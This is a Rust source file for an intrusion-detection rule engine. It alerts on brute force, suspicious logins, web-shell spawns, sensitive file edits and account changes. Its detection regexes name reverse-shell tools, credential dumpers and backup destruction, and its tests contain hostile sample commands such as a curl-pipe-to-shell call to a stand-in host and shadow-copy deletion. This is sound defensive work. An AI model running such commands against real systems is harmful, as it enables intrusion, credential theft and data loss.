//! Detection rules.
//!
//! Built-in rules cover what small teams actually get breached by or
//! audited on — brute force that *succeeds*, logins from somewhere new,
//! web servers spawning shells, download-and-execute one-liners, edits to
//! sudoers/authorized_keys, new admin accounts, cleared logs — and stay
//! quiet otherwise. Every alert says why it fired. Custom rules are simple
//! field/wildcard matches in the config file; there is no rule DSL to
//! learn.

use crate::core::config::{CustomRule, RulesConfig};
use crate::events::{Category, Event, Severity};
use crate::storage::event_store::SourceHistory;
use crate::util::{is_meaningful_remote_ip, wildcard_match, wildcard_match_ci};
use anyhow::Result;
use chrono::{DateTime, Duration, Local, NaiveTime, Utc};
use regex::Regex;
use std::collections::{HashMap, VecDeque};

struct CommandPattern {
    re: Regex,
    id: &'static str,
    title: &'static str,
    severity: Severity,
}

pub struct RuleEngine {
    cfg: RulesConfig,
    failures: HashMap<String, VecDeque<(DateTime<Utc>, String)>>,
    cooldown: HashMap<String, DateTime<Utc>>,
    /// Cooldown keys started during the current `evaluate` (with the value
    /// they replaced), so suppressed alerts can roll theirs back.
    fired: Vec<(String, Option<DateTime<Utc>>)>,
    commands: Vec<CommandPattern>,
    sensitive_files: Vec<(&'static str, Severity)>,
    custom: Vec<(CustomRule, Severity)>,
    business_hours: Option<(NaiveTime, NaiveTime)>,
}

const SHELLS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "ksh", "ash", "busybox", "cmd.exe", "powershell.exe", "pwsh.exe", "pwsh",
];
const WEB_SERVERS: &[&str] = &[
    "nginx", "apache2", "httpd", "lighttpd", "caddy", "php-fpm*", "php-cgi*", "w3wp.exe", "httpd.exe", "tomcat*",
    "php-cgi.exe", "nginx.exe",
];
const ADMIN_GROUPS: &[&str] = &[
    "sudo", "wheel", "admin", "root", "adm", "docker", "administrators", "domain admins", "enterprise admins",
    "remote desktop users", "backup operators",
];

fn sensitive_file_list() -> Vec<(&'static str, Severity)> {
    use Severity::*;
    vec![
        ("/etc/ld.so.preload", Critical),
        ("/etc/passwd", High),
        ("/etc/shadow", High),
        ("/etc/gshadow", High),
        ("/etc/group", Medium),
        ("/etc/sudoers", High),
        ("/etc/sudoers.d/*", High),
        ("*/authorized_keys", High),
        ("*/authorized_keys2", High),
        ("*administrators_authorized_keys", High),
        ("/etc/ssh/sshd_config", High),
        ("/etc/ssh/sshd_config.d/*", High),
        ("*\\ssh\\sshd_config", High),
        ("/etc/pam.d/*", High),
        ("/etc/security/*", Medium),
        ("/etc/crontab", Medium),
        ("/etc/cron.d/*", Medium),
        ("/etc/cron.hourly/*", Medium),
        ("/etc/cron.daily/*", Medium),
        ("/var/spool/cron/*", Medium),
        ("/etc/systemd/system/*", Medium),
        ("/etc/rc.local", Medium),
        ("/etc/profile.d/*", Medium),
        ("/etc/hosts", Medium),
        ("*\\drivers\\etc\\hosts", Medium),
        ("*\\Start Menu\\Programs\\StartUp\\*", High),
    ]
}

fn command_patterns() -> Vec<CommandPattern> {
    use Severity::*;
    let raw: &[(&str, &str, &str, Severity)] = &[
        (r"(?i)\b(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(ba|z|da)?sh\b", "download_exec", "Download piped straight into a shell", High),
        (r"(?i)base64\s+(-d|--decode)[^|]*\|\s*(ba|z|da)?sh\b", "encoded_exec", "Base64-decoded payload executed by a shell", High),
        (r"/dev/tcp/[0-9a-zA-Z.\-]+/\d+", "reverse_shell", "Possible reverse shell (/dev/tcp redirection)", Critical),
        (r"(?i)\b(nc|ncat|netcat)\b.*\s-(e|c)\s", "reverse_shell", "Netcat with command execution (reverse/bind shell)", Critical),
        (r"(?i)\bsocat\b.*exec:", "reverse_shell", "socat spawning a process (possible reverse shell)", High),
        (r"(?i)(history\s+-c\b|unset\s+HISTFILE|HISTFILE=/dev/null|HISTSIZE=0)", "history_tamper", "Shell history tampering", High),
        (r"(?i)\b(xmrig|minerd|cpuminer|xmr-stak|nbminer)\b", "cryptominer", "Cryptocurrency miner executed", Critical),
        (r"(?i)stratum\+tcp://", "cryptominer", "Mining pool connection string in command line", Critical),
        (r"(?i)\b(setenforce\s+0|ufw\s+disable|iptables\s+-F|systemctl\s+(stop|disable|mask)\s+(auditd|rsyslog|firewalld|apparmor|syslog))", "defense_evasion", "Security control disabled", High),
        (r"(?i)\b(rm|shred|truncate|>)\s.*(/var/log/(auth\.log|secure|wtmp|btmp|lastlog|audit)|\.bash_history)", "log_tamper", "Deleting or truncating audit logs", High),
        (r"(?i)\bchattr\s+\+i\s", "persistence", "File made immutable (chattr +i) — common persistence trick", Medium),
        (r"(?i)\b(mimikatz|sekurlsa|lsadump)\b", "credential_dump", "Credential dumping tool", Critical),
        (r"(?i)comsvcs(\.dll)?[^\n]*minidump", "credential_dump", "LSASS memory dump via comsvcs.dll", Critical),
        (r"(?i)\bprocdump(64)?(\.exe)?\b.*\blsass", "credential_dump", "LSASS memory dump via procdump", Critical),
        (r"(?i)vssadmin(\.exe)?\s+delete\s+shadows|wbadmin(\.exe)?\s+delete|bcdedit(\.exe)?.*recoveryenabled\s+no|wmic(\.exe)?\s+shadowcopy\s+delete", "ransomware_prep", "Backups / shadow copies being destroyed", Critical),
        (r"(?i)\bwevtutil(\.exe)?\s+(cl|clear-log)\b", "log_tamper", "Windows event log being cleared", Critical),
        (r"(?i)\b(powershell|pwsh)(\.exe)?\b.*\s-(e|ec|enc|encodedcommand)\s+[A-Za-z0-9+/=]{20,}", "encoded_exec", "Encoded PowerShell command", High),
        (r"(?i)(iex\s*\(|invoke-expression).*(downloadstring|invoke-webrequest|iwr\s|net\.webclient)", "download_exec", "PowerShell download-and-execute cradle", High),
        (r"(?i)\bcertutil(\.exe)?\b.*-urlcache", "download_exec", "certutil used to download a file", High),
        (r"(?i)\bnet(1)?(\.exe)?\s+localgroup\s+administrators\s+\S+\s+/add", "account_manipulation", "User added to local Administrators from the command line", High),
        (r"(?i)\bnet(1)?(\.exe)?\s+user\s+\S+\s+\S+\s+/add", "account_manipulation", "Local user created from the command line", Medium),
        (r"(?i)\breg(\.exe)?\s+add\s+.*\\(Run|RunOnce)\b", "persistence", "Autorun registry key added", Medium),
    ];
    raw.iter()
        .map(|(re, id, title, sev)| CommandPattern {
            re: Regex::new(re).expect("static command regex"),
            id,
            title,
            severity: *sev,
        })
        .collect()
}

fn parse_business_hours(s: &str) -> Option<(NaiveTime, NaiveTime)> {
    let (a, b) = s.split_once('-')?;
    Some((
        NaiveTime::parse_from_str(a.trim(), "%H:%M").ok()?,
        NaiveTime::parse_from_str(b.trim(), "%H:%M").ok()?,
    ))
}

fn base_user(u: &str) -> String {
    u.rsplit('\\').next().unwrap_or(u).to_ascii_lowercase()
}

impl RuleEngine {
    pub fn new(cfg: RulesConfig) -> Self {
        let custom = cfg
            .custom
            .iter()
            .filter(|r| !r.id.is_empty())
            .filter(|r| {
                ![&r.action, &r.user, &r.src_ip, &r.target, &r.command, &r.process]
                    .iter()
                    .all(|f| f.is_empty())
            })
            .map(|r| (r.clone(), Severity::parse(&r.severity).unwrap_or(Severity::Medium)))
            .collect();
        Self {
            business_hours: parse_business_hours(&cfg.business_hours),
            cfg,
            failures: HashMap::new(),
            cooldown: HashMap::new(),
            fired: Vec::new(),
            commands: command_patterns(),
            sensitive_files: sensitive_file_list(),
            custom,
        }
    }

    fn trusted(&self, ip: &str) -> bool {
        self.cfg.trusted_sources.iter().any(|p| wildcard_match(p, ip))
    }

    /// True if this rule+key hasn't fired within the cooldown window
    /// (and starts a new window). Every `true` is immediately followed by
    /// exactly one alert push, so `fired[i]` pairs with `out[i]`.
    fn fire(&mut self, rule: &str, key: &str, ts: DateTime<Utc>) -> bool {
        let k = format!("{rule}\u{1f}{key}");
        let cooldown = Duration::seconds(self.cfg.alert_cooldown_seconds as i64);
        match self.cooldown.get(&k) {
            Some(last) if ts - *last < cooldown && ts >= *last => false,
            prev => {
                self.fired.push((k.clone(), prev.copied()));
                self.cooldown.insert(k, ts);
                if self.cooldown.len() > 50_000 {
                    let cutoff = ts - cooldown;
                    self.cooldown.retain(|_, t| *t >= cutoff);
                }
                true
            }
        }
    }

    pub fn evaluate(&mut self, ev: &Event, history: &mut dyn SourceHistory) -> Result<Vec<Event>> {
        let mut out = Vec::new();
        match ev.category {
            Category::Auth | Category::Session => self.auth_rules(ev, history, &mut out)?,
            Category::Process => self.process_rules(ev, &mut out),
            Category::File => self.file_rules(ev, &mut out),
            Category::Account => self.account_rules(ev, &mut out),
            Category::Privilege => self.privilege_rules(ev, &mut out),
            Category::Service => {
                if ev.action == "service.installed" && self.fire("persistence_service", ev.target.as_deref().unwrap_or(""), ev.ts) {
                    out.push(alert(ev, "persistence_service", Severity::Medium, format!(
                        "New service installed: {}", ev.target.as_deref().unwrap_or("?")
                    )));
                }
            }
            Category::Agent if self.cfg.log_tampering && matches!(ev.action.as_str(), "log.cleared" | "log.truncated") => {
                let sev = if ev.action == "log.cleared" { Severity::Critical } else { Severity::High };
                if self.fire("log_tampering", ev.target.as_deref().unwrap_or(""), ev.ts) {
                    out.push(alert(ev, "log_tampering", sev, format!("Audit log tampering: {}", ev.message)));
                }
            }
            _ => {}
        }
        if ev.action == "persistence.scheduled_task" && self.fire("persistence_task", ev.target.as_deref().unwrap_or(""), ev.ts) {
            out.push(alert(ev, "persistence_task", Severity::Medium, ev.message.clone()));
        }
        self.custom_rules(ev, &mut out);
        let fired = std::mem::take(&mut self.fired);
        if !self.cfg.suppress.is_empty() {
            debug_assert_eq!(fired.len(), out.len(), "every fire() must pair with one alert");
            let mut kept = Vec::with_capacity(out.len());
            for (a, (key, prev)) in out.into_iter().zip(fired) {
                if self.suppressed(&a) {
                    // A suppressed alert must not start a cooldown that
                    // would silence a genuine one with the same key.
                    match prev {
                        Some(t) => self.cooldown.insert(key, t),
                        None => self.cooldown.remove(&key),
                    };
                } else {
                    kept.push(a);
                }
            }
            out = kept;
        }
        Ok(out)
    }

    fn suppressed(&self, a: &Event) -> bool {
        let rule = a.detail_str("rule").unwrap_or("");
        let p = a.process.as_ref();
        self.cfg.suppress.iter().any(|s| {
            let m = |pat: &str, v: Option<&str>| pat.is_empty() || v.map(|v| wildcard_match_ci(pat, v)).unwrap_or(false);
            m(&s.rule, Some(rule))
                && m(&s.user, a.user.as_deref())
                && m(&s.src_ip, a.src_ip.as_deref())
                && m(&s.target, a.target.as_deref())
                && m(&s.command, a.command_line())
                && m(&s.process, p.map(|p| p.name.as_str()))
                && m(&s.parent, p.and_then(|p| p.parent_name.as_deref()))
        })
    }

    fn auth_rules(&mut self, ev: &Event, history: &mut dyn SourceHistory, out: &mut Vec<Event>) -> Result<()> {
        let Some(ip) = ev.src_ip.clone().filter(|ip| is_meaningful_remote_ip(ip)) else {
            if ev.action == "session.start" {
                self.privileged_login(ev, out);
            }
            return Ok(());
        };
        let window = Duration::seconds(self.cfg.bruteforce_window_seconds as i64);

        if ev.action == "auth.failure" {
            let user = ev.user.clone().unwrap_or_default();
            let (count, users) = {
                let q = self.failures.entry(ip.clone()).or_default();
                q.push_back((ev.ts, user));
                // Keep enough history for the success-after-failures rule
                // (5x the brute-force window).
                while q.front().map(|(t, _)| ev.ts - *t > window * 5).unwrap_or(false) {
                    q.pop_front();
                }
                let recent: Vec<&(DateTime<Utc>, String)> = q.iter().filter(|(t, _)| ev.ts - *t <= window).collect();
                let mut users: Vec<String> = recent.iter().map(|(_, u)| u.clone()).collect();
                users.sort_unstable();
                users.dedup();
                (recent.len() as u32, users)
            };
            let distinct = users.len() as u32;

            if distinct >= self.cfg.spray_distinct_users && self.fire("password_spray", &ip, ev.ts) {
                out.push(
                    alert(ev, "password_spray", Severity::Medium, format!(
                        "Password spraying from {ip}: {distinct} different accounts tried in {}s",
                        self.cfg.bruteforce_window_seconds
                    ))
                    .detail("accounts_tried", users.iter().take(20).map(|s| s.to_string()).collect::<Vec<_>>()),
                );
            } else if count >= self.cfg.bruteforce_threshold && self.fire("bruteforce", &ip, ev.ts) {
                out.push(
                    alert(ev, "bruteforce", Severity::Medium, format!(
                        "Brute force from {ip}: {count} failed logins in {}s",
                        self.cfg.bruteforce_window_seconds
                    ))
                    .detail("failures", count),
                );
            }
            // Bound memory under a distributed attack.
            if self.failures.len() > 20_000 {
                let cutoff = ev.ts - window * 5;
                self.failures.retain(|_, q| q.back().map(|(t, _)| *t >= cutoff).unwrap_or(false));
            }
            return Ok(());
        }

        let is_success = matches!(ev.action.as_str(), "session.start" | "auth.success");
        if !is_success {
            return Ok(());
        }

        // The single most important signal: an attacker's guess worked.
        let user = ev.user.clone().unwrap_or_default();
        let (recent, same_user) = self
            .failures
            .get(&ip)
            .map(|q| {
                let window_q = q.iter().filter(|(t, _)| *t <= ev.ts && ev.ts - *t <= window * 5);
                let recent = window_q.clone().count();
                let same = window_q.filter(|(_, u)| base_user(u) == base_user(&user)).count();
                (recent, same)
            })
            .unwrap_or((0, 0));
        {
            if recent >= 3 && self.fire("success_after_failures", &ip, ev.ts) {
                out.push(
                    alert(ev, "success_after_failures", Severity::Critical, format!(
                        "Login SUCCEEDED for {user} from {ip} after {recent} failed attempts from that address"
                    ))
                    .detail("failed_attempts", recent)
                    .detail("failed_attempts_same_user", same_user),
                );
            }
        }

        if ev.action != "session.start" {
            return Ok(());
        }
        self.privileged_login(ev, out);

        let user = ev.user.clone().unwrap_or_default();
        // Always record, so the baseline builds even with the alert off.
        let prior = history.record_login(&user, &ip, ev.ts)?;
        if self.cfg.new_source_login && !self.trusted(&ip) {
            if let Some(prior) = prior {
                // prior == 0 is the first login we've ever seen for this
                // account: that's the baseline, not an anomaly.
                if prior > 0 && self.fire("new_source", &format!("{user}|{ip}"), ev.ts) {
                    out.push(
                        alert(ev, "new_source", Severity::Medium, format!(
                            "{user} logged in from a new address {ip} (previously seen from {prior} other address{})",
                            if prior == 1 { "" } else { "es" }
                        ))
                        .detail("known_sources", prior),
                    );
                }
            }
        }

        if let Some((start, end)) = self.business_hours {
            if !self.trusted(&ip) {
                let local = ev.ts.with_timezone(&Local).time();
                let inside = if start <= end {
                    local >= start && local <= end
                } else {
                    local >= start || local <= end
                };
                if !inside && self.fire("off_hours", &format!("{user}|{}", ev.ts.format("%Y%m%d")), ev.ts) {
                    out.push(alert(ev, "off_hours", Severity::Low, format!(
                        "{user} logged in at {} local time, outside business hours ({})",
                        local.format("%H:%M"),
                        self.cfg.business_hours
                    )));
                }
            }
        }
        Ok(())
    }

    fn privileged_login(&mut self, ev: &Event, out: &mut Vec<Event>) {
        if !self.cfg.privileged_account_login {
            return;
        }
        let protocol = ev.detail_str("protocol").unwrap_or("");
        if !matches!(protocol, "ssh" | "rdp") {
            return;
        }
        let user = ev.user.clone().unwrap_or_default();
        if matches!(base_user(&user).as_str(), "root" | "administrator")
            && self.fire("privileged_login", &format!("{user}|{}", ev.src_ip.as_deref().unwrap_or("")), ev.ts)
        {
            out.push(alert(ev, "privileged_login", Severity::Medium, format!(
                "Direct {protocol} login as {user}{} — use named accounts + sudo/UAC so actions are attributable",
                ev.src_ip.as_deref().map(|i| format!(" from {i}")).unwrap_or_default()
            )));
        }
    }

    fn process_rules(&mut self, ev: &Event, out: &mut Vec<Event>) {
        let Some(p) = &ev.process else { return };
        if self.cfg.suspicious_commands {
            if let Some(cmd) = p.command_line.as_deref() {
                let hit = self.commands.iter().find(|c| c.re.is_match(cmd)).map(|c| (c.id, c.title, c.severity));
                if let Some((id, title, sev)) = hit {
                    let key = format!("{}|{}", ev.session_id.as_deref().unwrap_or(""), crate::util::truncate(cmd, 200));
                    if self.fire(id, &key, ev.ts) {
                        out.push(alert(ev, id, sev, format!("{title}: {}", crate::util::truncate(cmd, 300))));
                    }
                }
            }
        }
        if self.cfg.webserver_shell {
            let name = p.name.to_ascii_lowercase();
            let parent = p.parent_name.as_deref().unwrap_or("").to_ascii_lowercase();
            if SHELLS.contains(&name.as_str()) && WEB_SERVERS.iter().any(|w| wildcard_match_ci(w, &parent)) {
                let key = format!("{parent}|{}", p.command_line.as_deref().unwrap_or(""));
                if self.fire("webserver_shell", &key, ev.ts) {
                    out.push(alert(ev, "webserver_shell", Severity::High, format!(
                        "Web server process {parent} spawned a shell ({name}) — classic web shell / RCE indicator: {}",
                        p.command_line.as_deref().unwrap_or("")
                    )));
                }
            }
        }
    }

    fn file_rules(&mut self, ev: &Event, out: &mut Vec<Event>) {
        if !self.cfg.sensitive_files {
            return;
        }
        let Some(path) = ev.target.as_deref() else { return };
        let hit = self
            .sensitive_files
            .iter()
            .find(|(pat, _)| wildcard_match(pat, path))
            .map(|(_, sev)| *sev);
        if let Some(sev) = hit {
            // Cool down per path *and* change, so two different edits to
            // sudoers are two alerts but an editor's triple-save is one.
            let key = format!("{path}|{}", ev.after_sha.as_deref().unwrap_or(&ev.action));
            if self.fire("sensitive_file", &key, ev.ts) {
                let who = ev
                    .user
                    .as_deref()
                    .map(|u| format!(" by {u}"))
                    .unwrap_or_else(|| " (actor not identified)".to_string());
                let verb = ev.action.strip_prefix("file.").unwrap_or(&ev.action);
                out.push(alert(ev, "sensitive_file", sev, format!("Sensitive file {verb}{who}: {path}")));
            }
        }
    }

    fn account_rules(&mut self, ev: &Event, out: &mut Vec<Event>) {
        if !self.cfg.account_changes {
            return;
        }
        let target = ev.target.clone().unwrap_or_default();
        let (sev, title) = match ev.action.as_str() {
            "account.user_created" => (Severity::Medium, format!("User account created: {target}")),
            "account.user_deleted" => (Severity::Medium, format!("User account deleted: {target}")),
            "account.user_enabled" => (Severity::Low, format!("User account enabled: {target}")),
            "account.group_member_added" => {
                let group = ev.detail_str("group").unwrap_or("").to_ascii_lowercase();
                let member = ev.detail_str("member").unwrap_or(&target).to_string();
                if ADMIN_GROUPS.contains(&group.as_str()) {
                    (Severity::High, format!("{member} added to privileged group '{group}'"))
                } else {
                    return;
                }
            }
            _ => return,
        };
        if self.fire(&ev.action, &format!("{target}|{}", ev.detail_str("group").unwrap_or("")), ev.ts) {
            out.push(alert(ev, "account_change", sev, title));
        }
    }

    fn privilege_rules(&mut self, ev: &Event, out: &mut Vec<Event>) {
        if ev.outcome == crate::events::Outcome::Failure {
            let user = ev.user.clone().unwrap_or_default();
            let reason = ev.detail_str("reason").unwrap_or("authentication failure").to_string();
            let sev = if reason.contains("NOT in sudoers") { Severity::Medium } else { Severity::Low };
            if self.fire("privilege_failure", &user, ev.ts) {
                out.push(alert(ev, "privilege_failure", sev, format!(
                    "{user} failed to elevate privileges ({reason})"
                )));
            }
        }
        // Successful sudo commands go through the suspicious-command rules
        // too (the command line is on the event).
        if ev.outcome != crate::events::Outcome::Failure && ev.process.is_some() {
            self.process_rules(ev, out);
        }
    }

    fn custom_rules(&mut self, ev: &Event, out: &mut Vec<Event>) {
        if ev.category == Category::Alert {
            return;
        }
        let mut fired = Vec::new();
        for (rule, sev) in &self.custom {
            let check = |pattern: &str, value: Option<&str>| {
                pattern.is_empty() || value.map(|v| wildcard_match_ci(pattern, v)).unwrap_or(false)
            };
            let matched = check(&rule.action, Some(&ev.action))
                && check(&rule.user, ev.user.as_deref())
                && check(&rule.src_ip, ev.src_ip.as_deref())
                && check(&rule.target, ev.target.as_deref())
                && check(&rule.command, ev.command_line())
                && check(&rule.process, ev.process.as_ref().map(|p| p.name.as_str()));
            if matched {
                fired.push((rule.clone(), *sev));
            }
        }
        for (rule, sev) in fired {
            let key = format!("{}|{}|{}", ev.action, ev.target.as_deref().unwrap_or(""), ev.command_line().unwrap_or(""));
            if self.fire(&format!("custom.{}", rule.id), &key, ev.ts) {
                let title = if rule.description.is_empty() { rule.id.clone() } else { rule.description.clone() };
                let mut a = alert(ev, &format!("custom.{}", rule.id), sev, format!("{title}: {}", ev.message));
                a.set_detail("notify", rule.notify);
                out.push(a);
            }
        }
    }
}

/// Builds an alert event that carries the trigger's who/where so alerts
/// are searchable and attributable on their own.
fn alert(trigger: &Event, rule: &str, severity: Severity, title: String) -> Event {
    let mut a = Event::new(Category::Alert, format!("alert.{rule}"), title)
        .at(trigger.ts)
        .severity(severity)
        .detail("rule", rule)
        .detail("trigger_action", trigger.action.clone());
    a.user = trigger.user.clone();
    a.src_ip = trigger.src_ip.clone();
    a.session_id = trigger.session_id.clone();
    a.target = trigger.target.clone();
    a.process = trigger.process.clone();
    a.host = trigger.host.clone();
    a
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::events::{Outcome, ProcessInfo};

    #[derive(Default)]
    struct MemHistory(HashMap<String, Vec<String>>);
    impl SourceHistory for MemHistory {
        fn record_login(&mut self, user: &str, ip: &str, _ts: DateTime<Utc>) -> Result<Option<usize>> {
            let v = self.0.entry(user.to_string()).or_default();
            if v.iter().any(|i| i == ip) {
                return Ok(None);
            }
            v.push(ip.to_string());
            Ok(Some(v.len() - 1))
        }
    }

    fn fail(ip: &str, user: &str, ts: DateTime<Utc>) -> Event {
        Event::new(Category::Auth, "auth.failure", "Failed password")
            .at(ts)
            .outcome(Outcome::Failure)
            .user(user)
            .src_ip(ip)
    }

    fn login(ip: &str, user: &str, ts: DateTime<Utc>) -> Event {
        Event::new(Category::Session, "session.start", "Accepted")
            .at(ts)
            .outcome(Outcome::Success)
            .user(user)
            .src_ip(ip)
            .detail("protocol", "ssh")
    }

    fn actions(v: &[Event]) -> Vec<String> {
        v.iter().map(|e| e.action.clone()).collect()
    }

    #[test]
    fn bruteforce_fires_once_then_success_is_critical() {
        let mut r = RuleEngine::new(RulesConfig::default());
        let mut h = MemHistory::default();
        let t0 = Utc::now();
        let mut all = Vec::new();
        for i in 0..30 {
            all.extend(r.evaluate(&fail("198.51.100.7", "root", t0 + Duration::seconds(i)), &mut h).unwrap());
        }
        assert_eq!(actions(&all), vec!["alert.bruteforce"], "cooldown suppresses repeats");
        let a = r.evaluate(&login("198.51.100.7", "root", t0 + Duration::seconds(40)), &mut h).unwrap();
        let crit = a.iter().find(|e| e.action == "alert.success_after_failures").expect("critical alert");
        assert_eq!(crit.severity, Severity::Critical);
        assert!(a.iter().any(|e| e.action == "alert.privileged_login"));
    }

    #[test]
    fn spraying_many_users() {
        let mut r = RuleEngine::new(RulesConfig::default());
        let mut h = MemHistory::default();
        let t0 = Utc::now();
        let mut all = Vec::new();
        for (i, u) in ["admin", "oracle", "test", "ubuntu", "git", "postgres"].iter().enumerate() {
            all.extend(r.evaluate(&fail("203.0.113.50", u, t0 + Duration::seconds(i as i64)), &mut h).unwrap());
        }
        assert!(actions(&all).contains(&"alert.password_spray".to_string()));
    }

    #[test]
    fn new_source_only_after_baseline() {
        let mut r = RuleEngine::new(RulesConfig::default());
        let mut h = MemHistory::default();
        let t0 = Utc::now();
        assert!(r.evaluate(&login("10.0.0.5", "alice", t0), &mut h).unwrap().is_empty(), "first login = baseline");
        assert!(r.evaluate(&login("10.0.0.5", "alice", t0), &mut h).unwrap().is_empty());
        let a = r.evaluate(&login("203.0.113.9", "alice", t0), &mut h).unwrap();
        assert_eq!(actions(&a), vec!["alert.new_source"]);

        let cfg = RulesConfig {
            trusted_sources: vec!["203.0.113.*".into()],
            ..Default::default()
        };
        let mut r = RuleEngine::new(cfg);
        let mut h = MemHistory::default();
        r.evaluate(&login("10.0.0.5", "bob", t0), &mut h).unwrap();
        assert!(r.evaluate(&login("203.0.113.9", "bob", t0), &mut h).unwrap().is_empty());
    }

    #[test]
    fn suspicious_commands_and_webshell() {
        let mut r = RuleEngine::new(RulesConfig::default());
        let mut h = MemHistory::default();
        let proc_ev = |name: &str, parent: &str, cmd: &str| {
            Event::new(Category::Process, "process.start", cmd.to_string()).process(ProcessInfo {
                pid: 1,
                name: name.into(),
                parent_name: Some(parent.into()),
                command_line: Some(cmd.into()),
                ..Default::default()
            })
        };
        let a = r.evaluate(&proc_ev("bash", "sshd", "bash -c curl -s http://x.y/i.sh | sh"), &mut h).unwrap();
        assert_eq!(actions(&a), vec!["alert.download_exec"]);
        let a = r.evaluate(&proc_ev("sh", "php-fpm8.2", "sh -c id"), &mut h).unwrap();
        assert_eq!(actions(&a), vec!["alert.webserver_shell"]);
        let a = r
            .evaluate(&proc_ev("vssadmin.exe", "cmd.exe", "vssadmin.exe delete shadows /all /quiet"), &mut h)
            .unwrap();
        assert_eq!(a[0].severity, Severity::Critical);
        assert!(r.evaluate(&proc_ev("vim", "bash", "vim /etc/nginx/nginx.conf"), &mut h).unwrap().is_empty());
        assert!(r.evaluate(&proc_ev("bash", "sshd", "bash"), &mut h).unwrap().is_empty());
    }

    #[test]
    fn sensitive_files_accounts_and_custom_rules() {
        let mut cfg = RulesConfig::default();
        cfg.custom.push(CustomRule {
            id: "prod-nginx".into(),
            description: "nginx config changed".into(),
            severity: "high".into(),
            action: "file.*".into(),
            target: "/etc/nginx/*".into(),
            ..Default::default()
        });
        let mut r = RuleEngine::new(cfg);
        let mut h = MemHistory::default();
        let f = |path: &str| Event::new(Category::File, "file.modified", "m").target(path).user("alice");
        let a = r.evaluate(&f("/etc/sudoers.d/90-cloud"), &mut h).unwrap();
        assert_eq!(actions(&a), vec!["alert.sensitive_file"]);
        assert!(a[0].message.contains("by alice"));
        let a = r.evaluate(&f("/etc/nginx/nginx.conf"), &mut h).unwrap();
        assert_eq!(actions(&a), vec!["alert.custom.prod-nginx"]);
        assert_eq!(a[0].severity, Severity::High);
        assert!(r.evaluate(&f("/etc/motd"), &mut h).unwrap().is_empty());

        // Suppression: same alert, silenced for a known automation parent.
        let mut cfg = RulesConfig::default();
        cfg.suppress.push(crate::core::config::SuppressRule {
            rule: "encoded_exec".into(),
            parent: "ansible*".into(),
            reason: "Ansible WinRM uses encoded PowerShell".into(),
            ..Default::default()
        });
        let mut quiet = RuleEngine::new(cfg);
        let ps = |parent: &str| {
            Event::new(Category::Process, "process.start", "ps").process(ProcessInfo {
                pid: 9,
                name: "powershell.exe".into(),
                parent_name: Some(parent.into()),
                command_line: Some("powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA".into()),
                ..Default::default()
            })
        };
        assert!(quiet.evaluate(&ps("ansible-winrm.exe"), &mut h).unwrap().is_empty());
        assert_eq!(quiet.evaluate(&ps("explorer.exe"), &mut h).unwrap().len(), 1);

        let grp = Event::new(Category::Account, "account.group_member_added", "x")
            .target("mallory")
            .detail("group", "sudo")
            .detail("member", "mallory");
        let a = r.evaluate(&grp, &mut h).unwrap();
        assert_eq!(a[0].severity, Severity::High);
    }
}
